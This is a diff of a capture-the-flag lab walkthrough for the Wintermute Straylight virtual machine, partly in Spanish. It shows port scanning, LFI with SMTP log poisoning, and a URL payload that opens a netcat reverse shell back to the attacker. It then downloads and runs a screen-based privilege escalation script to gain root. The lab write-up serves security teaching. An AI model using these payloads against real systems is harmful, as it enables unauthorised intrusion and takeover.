@@ -26,91 +26,119 @@ Feature:
   | Google Chrome   | 104.0.5112.101  |
   | Nast V.         | 0.2.0           | 
   | Nmap            | 7.92            |
-
+  | Netcat          | v1.10-46        |
+  | Python          | 3.10            |
+  | Wget            | 1.21            |
+  
   Toe information:
-    Given I am running the "wintwemute.ova" virtual machine Virtualbox
+    Given I am running the "Wintermute-Straylight-beta.ova" virtual machine Virtualbox
 
   Scenario: Dynamic detection
     Then I scan my network and search IP to machine Straylight
+
     """
-    sudo nast -m ens33
+	 sudo nast -m ens33
     """
     And see connected devices
-    When I see the ip of the victim machine [evidence] (03.png)
+    When I see the ip of the victim machine [dkb4rb] (1.png)
     Then I try scanning the open ports
  
     """
-    nmap -p- -sCV  --min-rate 5000 192.168.18.59 -Pn
+	 sudo nmap -p- --open -sCV --min-rate 5000 -Pn 192.168.18.94 > scann 
     """
-    Then I see that ports 80 and 6688 are open [evidence] (02.png)
-    And I perform a scanning of possible routes
+    Then I see that ports 25, 80, 3000 are open [dkb4rb] (02.png)
+	and other evidence is the file [dkb4rb / nmap] (scann)
+    
     """
-    gobuster dir -u http://192.168.0.105/ -w /usr/share/wordlists/
-    directory-list2.3-medium.txt -t 50 -x html,php,txt
     """
-    When I see the route "/lavalamp" available [evidence] (03.png)
-    Then I see you have a web service [evidence] (04.png)
-    When I see that it contains a form [evidence] (05.png)
-    Then test the form and see where my request travels to
-    And I can see the path "canyoubypassme.php" [evidence] (06.png)
+    Here we see that there is a web application in port 80 http that gives us a little information on what to do. [ dkb4rb ] (3.png)
+    We continue looking for port 3000 and we see an administration panel that tells us that it has default passwords. [ dkb4rb ] (4.png)
 
-  Scenario: Exploitation
-    Then I go to the route found [evidence] (07.png)
+ Scenario: Exploitation
+    Here we enter an administration panel where we see some directories that are available which are:  [ dkb4rb ] (5.png)
+	"/fresside" where there is not much to see just a background image. [ dkb4rb ] (6.png)
+	"/turing-bolo" where we see that we can select several use cases but at this time we use the one called case. [ dkb4rb ] (7.png)
+            when we enter est we see that there is a potential LFI exploitation vector. [ dkb4rb ] (8.png)
+    We also see that he tells us about some mail logs which can be used to make an SMTP poisoning. [ dkb4rb ] (9.png)
+    but first we will try to see if there are any parameters in the url that can be used to make arbitrary remote code execute. [ dkb4rb ] (10.png)
+	but it does not work so we proceed to do the SMTP poisoning, to establish a new variable that allows us to execute code. [ dkb4rb ]  (11.png)
+    
     """
-    http://192.168.0.105/lavalamp/canyoubypassme.php
+     nc -nv 192.168.18.94 25
     """
-    When I inspect the page
-    Then I change the "opacity" value from 0.0 to 1.0
-    And I get the form to be visible on the website [evidence] (08.png)
-    Then I enter a value in the form
-    When I receive an empty response [evidence] (09.png)
-    Then I will test if it is vulnerable to LFI
-    """
-    1../../../../etc/passwd
-    """
-    Then I can see the user "ford" [evidence] (10.png)
-    When I apply another payload I get its id_rsa [evidence] (11.png)
-    Then I assign write and read permissions on the id_rsa
-    """
-    chmod 600 id_rsa
-    """
-    And I get access through ssh with the user "ford" [evidence] (12.png)
+    Ok after establishing this we see that we can already do the remote code execution. [ dkb4rb ] (12.png)
 
-  Scenario: Privilege escalation
-    And I see that "ford" is a member of the "lxd" group [evidence] (13.png)
-    When I download "build-alpine" on my local machine [evidence] (14.png)
-    Then I run "build-alpine" to generate an image [evidence] (15.png)
-    When I use an "Http" server with "Python"
     """
-    python -m http.server 443
+     http://192.168.18.94//turing-bolo/bolo.php?bolo=../../../../../var/log/mail&cmd=ifconfig
     """
-    Then I download the ".tar" file to the victim machine [evidence] (16.png)
+    then I see the output of the command, this is working. [ dkb4rb ] (13.png)
+
     """
-    wget http://192.168.0.192:443/alpine-v3.16-x8
+     nc -lvp 403
     """
-    When I import the image for "lxd" [evidence] (17.png)
+    Luego procederemos a ponernos en escucha por el puerto 403 para hacer la revershell. [ dkb4rb ] (14.png)
+
     """
-    lxc image import ./alpine-v3.16-x86_64-20220820_1413.tar.gz
-    --alias myimage
+     http://192.168.18.94//turing-bolo/bolo.php?bolo=../../../../../var/log/mail&cmd=nc%20192.168.18.93%20403%20-c%20/bin/bash
     """
-    Then I start the image inside a new container
+    Ya que estamos en escucha enviamos el payload en el servicio http que nos dara la revershell desde el servidor nuestra ip. [ dkb4rb ] (15.png)
+
     """
-    lxc init myimage ignite -c security.privileged=true
+     id
     """
-    And I mount the container inside the directory "/root"
+    Como resultado vemos que estamos dentro del usuario "www-data".
+
     """
-    lxc config device add ignite mydevice disk source=/ path=/mnt/root
-    recursive=root
+     script /dev/null -c bash
+     Ctrl + Z
+     tty raw -echo;fg
+	 reset
     """
-    When I start the container
+    hacemos el tratamiento del "TTY"
+    
     """
-    lxc start ignite
+     export TERM=xterm
+     export SHELL=bash
     """
-    Then I run bash on the container
+    exportaremos las variables de entorno para tener una consola totalmente interactiva.
+    
+ Scenario: Privilege escalation 
+    Ahora procedemos hacer la busqueda de algun programa que nos permita escalar privilegios hacia el usuario "root".
+	Aqui vemos que el programa de screen-4.5 puede ser ejecutado por nosotros y es una potencial via para escalar privilegios.
+    Para esto hay exploits ya elaborados, pero como nos gusta saber como funciona todo a bajo nivel tendremos uno parecido a estos. [ dkb4rb/exploits ] (PrivShell.sh)
     """
-    lxc exec ignite /bin/sh
+     find / -perm -u=s -type file 2>/dev/null
     """
-    And I have access to the "root" user [evidence] (18.png)
+
+    """
+     python3 -m http.server 8000
+    """
+	Ahora que tenemos el script procedemos a compartirlo a nuestro servidor vulnerable con ayuda del simple http server de "python3" por el puerto 8000.
+
+    """
+     wget http://192.168.18.93:8000/PrivShell.sh
+    """
+	Ahora nos descargamos el programa con ayuda de "Wget".
+
+    """
+     chmod +x PrivShell.sh
+    """
+	Procedemos a dar permisos de ejecusion al programa.
+
+	"""
+	 ./PrivShell.sh
+	"""
+	And I have access to the "root" user
+
+	"""
+	 cd /root
+	"""
+	navegamos a el directorio del usuario root y alli veremos la flag.
+
+	"""
+	 cat flag.txt
+	"""
+	vemos la flag.
 
   Scenario: Remediation
     Given that the service is vulnerable to LFI
@@ -126,4 +154,4 @@ Feature:
     7.5/10 (High) - CR:H/IR:H/AR:H/MAV:N/MAC:H/MPR:H/MS:C/MC:H/MI:H/MA:H
 
   Scenario: Correlations
-    No correlations have been found to this date 2022-08-23
+    No correlations have been found to this date 2022-08-31
